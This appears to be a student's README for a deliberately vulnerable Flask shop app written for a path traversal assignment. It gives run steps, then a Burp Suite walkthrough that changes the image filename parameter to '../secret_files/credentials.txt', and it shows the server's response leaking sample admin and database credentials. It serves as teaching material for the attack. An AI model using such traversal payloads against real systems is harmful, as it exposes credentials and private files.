e-commerce demo app for a path traversal assignment.

HOW TO RUN

open terminal
go to repo root
the run:
  python app.py

if not works run pip install flask in repo root
the run:
  python app.py

Then open http://127.0.0.1:5000/




ATTACK

open website with burp suite and load website 
go to proxy sub tab
find in http history where frontend requests the image from api /image endpoint http://127.0.0.1:5000/image?filename=61.jpg
move the request to repeater tab
change url so you can traverse back to the project root and read content from secret files
eg:
GET /image?filename=../secret_files/credentials.txt




OUTPUT

HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.11.9
Date: Mon, 21 Sep 2026 17:27:22 GMT
Content-Disposition: inline; filename=credentials.txt
Content-Type: text/plain; charset=utf-8
Content-Length: 120
Last-Modified: Mon, 21 Sep 2026 17:21:37 GMT
Cache-Control: no-cache
ETag: "1790011297.9762893-120-498801771"
Date: Mon, 21 Sep 2026 17:27:22 GMT
Accept-Ranges: bytes
Connection: close

admin_username=admin
admin_password=abc123!
db_connection_string=postgres://admin:SuperSecret123!@localhost:5432/shopdb



RESOURCES I'VE USED

https://portswigger.net/web-security/file-path-traversal
https://community.owasp.org/attacks/Path_Traversal